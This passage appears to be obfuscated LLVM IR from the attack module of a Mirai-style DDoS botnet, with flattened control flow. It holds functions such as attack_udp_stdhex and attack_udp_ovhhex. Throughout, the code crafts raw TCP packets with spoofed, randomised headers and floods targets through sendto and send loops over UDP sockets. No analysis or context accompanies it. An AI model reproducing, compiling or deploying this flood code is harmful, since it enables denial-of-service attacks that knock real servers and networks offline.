  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand_next()
  %266 = and i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  %270 = load i8, i8* %22, align 1
  %271 = icmp ne i8 %270, 0
  %272 = select i1 %271, i32 -1783332357, i32 -2097450393
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %276, -2049
  %278 = or i16 %277, 2048
  store i16 %278, i16* %275, align 4
  store i32 -2097450393, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8*, i8** %31, align 8
  %281 = load i32, i32* %26, align 4
  call void @rand_str(i8* %280, i32 %281)
  store i32 1769514503, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %9, align 4
  %284 = add nsw i32 %283, 1
  store i32 %284, i32* %9, align 4
  store i32 -1387494873, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  store i32 1726257238, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 995697443, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %9, align 4
  %289 = load i8, i8* %5, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = select i1 %291, i32 -2042552853, i32 1626896274
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8**, i8*** %11, align 8
  %295 = load i32, i32* %9, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds i8*, i8** %294, i64 %296
  %298 = load i8*, i8** %297, align 8
  store i8* %298, i8** %32, align 8
  %299 = load i8*, i8** %32, align 8
  %300 = bitcast i8* %299 to %struct.iphdr*
  store %struct.iphdr* %300, %struct.iphdr** %33, align 8
  %301 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i64 1
  %303 = bitcast %struct.iphdr* %302 to %struct.tcphdr*
  store %struct.tcphdr* %303, %struct.tcphdr** %34, align 8
  %304 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i64 1
  %306 = bitcast %struct.tcphdr* %305 to i8*
  store i8* %306, i8** %35, align 8
  %307 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %307, i64 %309
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i32 0, i32 2
  %312 = load i8, i8* %311, align 4
  %313 = zext i8 %312 to i32
  %314 = icmp slt i32 %313, 32
  %315 = select i1 %314, i32 382843367, i32 -955477637
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  store i32 -955477637, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %28, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 -740830206, i32 1937266504
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = call i32 @rand_next()
  %343 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 8
  store i32 %342, i32* %344, align 4
  store i32 1937266504, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i16, i16* %13, align 2
  %347 = zext i16 %346 to i32
  %348 = icmp eq i32 %347, 65535
  %349 = select i1 %348, i32 -1943633835, i32 826731104
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %355 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %354, i32 0, i32 3
  store i16 %353, i16* %355, align 4
  store i32 826731104, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i16, i16* %16, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  %360 = select i1 %359, i32 -377332749, i32 -380738366
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = call i32 @rand_next()
  %363 = and i32 %362, 65535
  %364 = trunc i32 %363 to i16
  %365 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %366 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %365, i32 0, i32 0
  store i16 %364, i16* %366, align 4
  store i32 -380738366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i16, i16* %17, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp eq i32 %369, 65535
  %371 = select i1 %370, i32 -1703273549, i32 -1200298379
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 1
  store i16 %375, i16* %377, align 2
  store i32 -1200298379, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %18, align 4
  %380 = icmp eq i32 %379, 65535
  %381 = select i1 %380, i32 -561886979, i32 -1499769962
  store i32 %381, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -1499769962, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 -61147299, i32 -1587560763
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 -1587560763, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 2033074507, i32 -1584945856
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 -1584945856, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 -73025798, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 995697443, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 1726257238, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  store i32 %50, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 261476026, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 261476026, label %first
    i32 1677549837, label %53
    i32 232481224, label %56
    i32 593614049, label %59
    i32 -1086548737, label %60
    i32 -964115904, label %66
    i32 1502317991, label %82
    i32 -2005777808, label %91
    i32 766666959, label %100
    i32 -1327879542, label %108
    i32 328446512, label %109
    i32 1482881363, label %127
    i32 277706099, label %128
    i32 -2017552115, label %138
    i32 -870254946, label %164
    i32 -1044099846, label %182
    i32 -709153169, label %183
    i32 1206993667, label %184
    i32 -390560778, label %187
    i32 -51895224, label %188
    i32 1065938783, label %189
    i32 -1506770566, label %195
    i32 934701524, label %204
    i32 -1488198924, label %208
    i32 1223092468, label %218
    i32 -414168678, label %221
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %51 = icmp eq i32 %.reload, 65535
  %52 = select i1 %51, i32 1677549837, i32 232481224
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = call i32 @rand_next()
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %13, align 2
  store i32 593614049, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i16, i16* %13, align 2
  %58 = call zeroext i16 @htons(i16 zeroext %57) #7
  store i16 %58, i16* %13, align 2
  store i32 593614049, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1086548737, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %9, align 4
  %62 = load i8, i8* %5, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp slt i32 %61, %63
  %65 = select i1 %64, i32 -964115904, i32 -390560778
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %67, i8* bitcast ([256 x i8*]* @attack_udp_stdhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %68 = call i32 @rand() #6
  %69 = srem i32 %68, 256
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %70
  %72 = load i8*, i8** %71, align 8
  store i8* %72, i8** %20, align 8
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %74 = load i8**, i8*** %10, align 8
  %75 = load i32, i32* %9, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8*, i8** %74, i64 %76
  store i8* %73, i8** %77, align 8
  %78 = load i16, i16* %12, align 2
  %79 = zext i16 %78 to i32
  %80 = icmp eq i32 %79, 65535
  %81 = select i1 %80, i32 1502317991, i32 -2005777808
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = call i32 @rand_next()
  %84 = trunc i32 %83 to i16
  %85 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %86 = load i32, i32* %9, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  store i32 766666959, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i16, i16* %12, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %95 = load i32, i32* %9, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 0
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %98, i32 0, i32 1
  store i16 %93, i16* %99, align 2
  store i32 766666959, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %102 = load i32*, i32** %11, align 8
  %103 = load i32, i32* %9, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 %101, i32* %105, align 4
  %106 = icmp eq i32 %101, -1
  %107 = select i1 %106, i32 -1327879542, i32 328446512
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  ret void

; <label>:109:                                    ; preds = %loopEntry
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load i16, i16* %13, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %111, i16* %112, align 2
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %114 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %113, i32 0, i32 0
  store i32 0, i32* %114, align 4
  %115 = load i32*, i32** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %115, i64 %117
  %119 = load i32, i32* %118, align 4
  %120 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %121 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %121, %struct.sockaddr** %120, align 8
  %122 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %123 = load %struct.sockaddr*, %struct.sockaddr** %122, align 8
  %124 = call i32 @bind(i32 %119, %struct.sockaddr* %123, i32 16) #6
  %125 = icmp eq i32 %124, -1
  %126 = select i1 %125, i32 1482881363, i32 277706099
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 277706099, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i64 %131
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i32 0, i32 2
  %134 = load i8, i8* %133, align 4
  %135 = zext i8 %134 to i32
  %136 = icmp slt i32 %135, 32
  %137 = select i1 %136, i32 -2017552115, i32 -870254946
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i64 %141
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i32 0, i32 1
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #7
  %146 = call i32 @rand_next()
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = lshr i32 %146, %153
  %155 = add i32 %145, %154
  %156 = call i32 @htonl(i32 %155) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  store i32 -870254946, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i32*, i32** %11, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  %181 = select i1 %180, i32 -1044099846, i32 -709153169
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  store i32 -709153169, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 1206993667, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %9, align 4
  %186 = add nsw i32 %185, 1
  store i32 %186, i32* %9, align 4
  store i32 -1086548737, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 -51895224, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1065938783, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %9, align 4
  %191 = load i8, i8* %5, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp slt i32 %190, %192
  %194 = select i1 %193, i32 -1506770566, i32 -414168678
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %10, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8*, i8** %196, i64 %198
  %200 = load i8*, i8** %199, align 8
  store i8* %200, i8** %23, align 8
  %201 = load i8, i8* %15, align 1
  %202 = icmp ne i8 %201, 0
  %203 = select i1 %202, i32 934701524, i32 -1488198924
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %23, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i32
  call void @rand_str(i8* %205, i32 %207)
  store i32 -1488198924, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load i32*, i32** %11, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds i32, i32* %209, i64 %211
  %213 = load i32, i32* %212, align 4
  %214 = load i8*, i8** %23, align 8
  %215 = load i16, i16* %14, align 2
  %216 = zext i16 %215 to i64
  %217 = call i64 @send(i32 %213, i8* %214, i64 %216, i32 16384)
  store i32 1223092468, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %9, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %9, align 4
  store i32 1065938783, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  store i32 -51895224, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %221, %218, %208, %204, %195, %189, %188, %187, %184, %183, %182, %164, %138, %128, %127, %109, %100, %91, %82, %66, %60, %59, %56, %53, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_ovhhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
